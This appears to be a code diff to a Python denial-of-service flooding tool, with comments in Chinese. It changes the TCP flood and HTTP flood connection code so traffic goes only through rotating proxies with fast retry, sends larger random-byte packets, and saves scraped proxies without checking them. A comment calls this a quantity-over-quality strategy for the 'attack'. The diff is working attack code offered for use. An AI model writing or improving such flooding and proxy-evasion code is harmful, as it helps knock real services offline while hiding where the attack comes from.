@@ -487,22 +487,73 @@ class Layer4(Thread):
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
-        if self._proxies:
-            s = randchoice(self._proxies).open_socket(
-                conn_type, sock_type, proto_type)
+        # 如果配置了代理，强制使用代理，不允许直接连接
+        if self._proxies and len(self._proxies) > 0:
+            # 优化：快速失败，快速重试，最多尝试5个不同的代理
+            max_retries = min(5, len(self._proxies))
+            last_exception = None
+            
+            # 优化：使用随机选择，避免重复选择相同代理
+            # 随机选择不同的代理，确保每次尝试不同的代理
+            proxies_list = list(self._proxies)
+            proxies_to_try = []
+            used_indices = set()
+            for _ in range(max_retries):
+                if len(used_indices) >= len(proxies_list):
+                    break
+                idx = randint(0, len(proxies_list) - 1)
+                while idx in used_indices:
+                    idx = randint(0, len(proxies_list) - 1)
+                used_indices.add(idx)
+                proxies_to_try.append(proxies_list[idx])
+            
+            for proxy in proxies_to_try:
+                try:
+                    s = proxy.open_socket(conn_type, sock_type, proto_type)
+                    # 优化：代理连接使用更短的超时，快速失败
+                    s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                    # 优化：代理连接超时缩短到0.5秒，快速失败快速重试
+                    s.settimeout(0.5)
+                    s.connect(self._target)
+                    # 优化：连接成功后，将超时设置为更长，保持连接稳定
+                    s.settimeout(5.0)
+                    return s
+                except Exception as e:
+                    last_exception = e
+                    # 快速失败，立即尝试下一个代理
+                    continue
+            
+            # 如果所有代理都失败，抛出异常而不是回退到直接连接
+            raise Exception(f"所有代理连接失败: {last_exception}")
         else:
+            # 没有代理时才允许直接连接
             s = socket(conn_type, sock_type, proto_type)
-        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(.9)
-        s.connect(self._target)
-        return s
+            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+            s.settimeout(.9)
+            s.connect(self._target)
+            return s
 
     def TCP(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)):
+        # 优化：增加重试机制，快速失败快速重试
+        max_connection_retries = 3
+        for _ in range(max_connection_retries):
+            s = None
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                # 优化：增加发送缓冲区大小，提高发送效率
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                # 优化：使用更大的数据包，减少发送次数
+                packet_size = 2048  # 从1024增加到2048
+                while Tools.send(s, randbytes(packet_size)):
+                    continue
+                # 如果发送成功，退出重试循环
+                Tools.safe_close(s)
+                return
+            except Exception:
+                Tools.safe_close(s)
+                # 快速失败，立即重试
                 continue
-        Tools.safe_close(s)
+        # 如果所有重试都失败，静默失败（由suppress处理）
 
     def MINECRAFT(self) -> None:
         handshake = Minecraft.handshake(self._target, self.protocolid, 1)
@@ -933,22 +984,67 @@ class HttpFlood(Thread):
                            "\r\n"))
 
     def open_connection(self, host=None) -> socket:
-        if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+        target_host = host or self._raw_target
+        
+        # 如果配置了代理，强制使用代理，不允许直接连接
+        if self._proxies and len(self._proxies) > 0:
+            # 优化：快速失败，快速重试，最多尝试5个不同的代理
+            max_retries = min(5, len(self._proxies))
+            last_exception = None
+            
+            # 优化：使用随机选择，避免重复选择相同代理
+            # 随机选择不同的代理，确保每次尝试不同的代理
+            proxies_list = list(self._proxies)
+            proxies_to_try = []
+            used_indices = set()
+            for _ in range(max_retries):
+                if len(used_indices) >= len(proxies_list):
+                    break
+                idx = randint(0, len(proxies_list) - 1)
+                while idx in used_indices:
+                    idx = randint(0, len(proxies_list) - 1)
+                used_indices.add(idx)
+                proxies_to_try.append(proxies_list[idx])
+            
+            for proxy in proxies_to_try:
+                try:
+                    sock = proxy.open_socket(AF_INET, SOCK_STREAM)
+                    # 优化：代理连接使用更短的超时，快速失败
+                    sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                    # 优化：代理连接超时缩短到0.5秒，快速失败快速重试
+                    sock.settimeout(0.5)
+                    sock.connect(target_host)
+                    # 优化：连接成功后，将超时设置为更长，保持连接稳定
+                    sock.settimeout(5.0)
+                    
+                    if self._target.scheme.lower() == "https":
+                        sock = ctx.wrap_socket(sock,
+                                               server_hostname=host[0] if host else self._target.host,
+                                               server_side=False,
+                                               do_handshake_on_connect=True,
+                                               suppress_ragged_eofs=True)
+                    return sock
+                except Exception as e:
+                    last_exception = e
+                    # 快速失败，立即尝试下一个代理
+                    continue
+            
+            # 如果所有代理都失败，抛出异常而不是回退到直接连接
+            raise Exception(f"所有代理连接失败: {last_exception}")
         else:
+            # 没有代理时才允许直接连接
             sock = socket(AF_INET, SOCK_STREAM)
+            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+            sock.settimeout(.9)
+            sock.connect(target_host)
 
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(.9)
-        sock.connect(host or self._raw_target)
-
-        if self._target.scheme.lower() == "https":
-            sock = ctx.wrap_socket(sock,
-                                   server_hostname=host[0] if host else self._target.host,
-                                   server_side=False,
-                                   do_handshake_on_connect=True,
-                                   suppress_ragged_eofs=True)
-        return sock
+            if self._target.scheme.lower() == "https":
+                sock = ctx.wrap_socket(sock,
+                                       server_hostname=host[0] if host else self._target.host,
+                                       server_side=False,
+                                       do_handshake_on_connect=True,
+                                       suppress_ragged_eofs=True)
+            return sock
 
     @property
     def randHeadercontent(self) -> str:
@@ -1364,11 +1460,37 @@ class HttpFlood(Thread):
 class ProxyManager:
 
     @staticmethod
-    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
-        providrs = [
-            provider for provider in cf["proxy-providers"]
-            if provider["type"] == Proxy_type or Proxy_type == 0
-        ]
+    def DownloadFromConfig(cf, Proxy_type: int, enabled_providers: list = None) -> Set[Proxy]:
+        """
+        从配置下载代理
+        
+        Args:
+            cf: 配置文件
+            Proxy_type: 代理类型
+            enabled_providers: 启用的代理源列表（None表示全部启用，可以是索引列表或URL列表）
+        """
+        all_providers = cf["proxy-providers"]
+        
+        # 如果指定了启用的源，进行过滤
+        if enabled_providers is not None and len(enabled_providers) > 0:
+            # enabled_providers是索引列表或URL列表
+            filtered_providers = []
+            for idx, provider in enumerate(all_providers):
+                # 检查是否在启用列表中（通过索引或URL）
+                provider_url = provider.get("url", "")
+                if idx in enabled_providers or provider_url in enabled_providers:
+                    filtered_providers.append(provider)
+            providrs = [
+                provider for provider in filtered_providers
+                if provider["type"] == Proxy_type or Proxy_type == 0
+            ]
+        else:
+            # 使用所有源
+            providrs = [
+                provider for provider in all_providers
+                if provider["type"] == Proxy_type or Proxy_type == 0
+            ]
+        
         logger.info(
             f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                 providrs))
@@ -1394,7 +1516,31 @@ class ProxyManager:
         proxes: Set[Proxy] = set()
         with suppress(TimeoutError, exceptions.ConnectionError,
                       exceptions.ReadTimeout):
-            data = get(provider["url"], timeout=provider["timeout"]).text
+            response = get(provider["url"], timeout=provider["timeout"])
+            
+            # 检查是否是JSON格式的API响应（proxy.scdn.io）
+            try:
+                json_data = response.json()
+                if isinstance(json_data, dict) and "data" in json_data:
+                    # 处理proxy.scdn.io的JSON格式
+                    if "proxies" in json_data["data"]:
+                        proxies_list = json_data["data"]["proxies"]
+                        for proxy_str in proxies_list:
+                            try:
+                                # 解析 "IP:PORT" 格式
+                                proxy = ProxyUtiles.parseAllIPPort(
+                                    [proxy_str], proxy_type
+                                )
+                                proxes.update(proxy)
+                            except Exception:
+                                pass
+                        return proxes
+            except (ValueError, KeyError):
+                # 不是JSON格式，按文本处理
+                pass
+            
+            # 处理文本格式（原有逻辑）
+            data = response.text
             try:
                 for proxy in ProxyUtiles.parseAllIPPort(
                         data.splitlines(), proxy_type):
@@ -1636,7 +1782,7 @@ class ToolsConsole:
         return {"success": False}
 
 
-def handleProxyList(con, proxy_li, proxy_ty, url=None):
+def handleProxyList(con, proxy_li, proxy_ty, url=None, enabled_providers=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
@@ -1646,24 +1792,27 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty, enabled_providers)
             logger.info(
-                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
+                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies downloaded, skipping validation (quantity over quality strategy){bcolors.RESET}!"
             )
-            Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=5, threads=threads,
-                url=url.human_repr() if url else "http://httpbin.org/get",
-            )
-
+            # 策略变更：不验证，直接保存所有代理
+            # 原因：
+            # 1. 验证过程耗时很长（特别是大量代理）
+            # 2. 攻击时已有快速失败和重试机制（最多尝试5个代理）
+            # 3. 数量优先：代理足够多时，即使部分失效也能找到可用的
+            # 如果用户需要验证，可以使用"检查代理"功能
+            
             if not Proxies:
-                exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
-                )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += (proxy.__str__() + "\n")
-            wr.write(stringBuilder)
+                logger.warning(
+                    f"{bcolors.WARNING}No proxies downloaded, running flood without proxy{bcolors.RESET}")
+            else:
+                stringBuilder = ""
+                for proxy in Proxies:
+                    stringBuilder += (proxy.__str__() + "\n")
+                wr.write(stringBuilder)
+                logger.info(
+                    f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies saved (unverified). Attack will auto-retry multiple proxies.{bcolors.RESET}")
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
     if proxies:
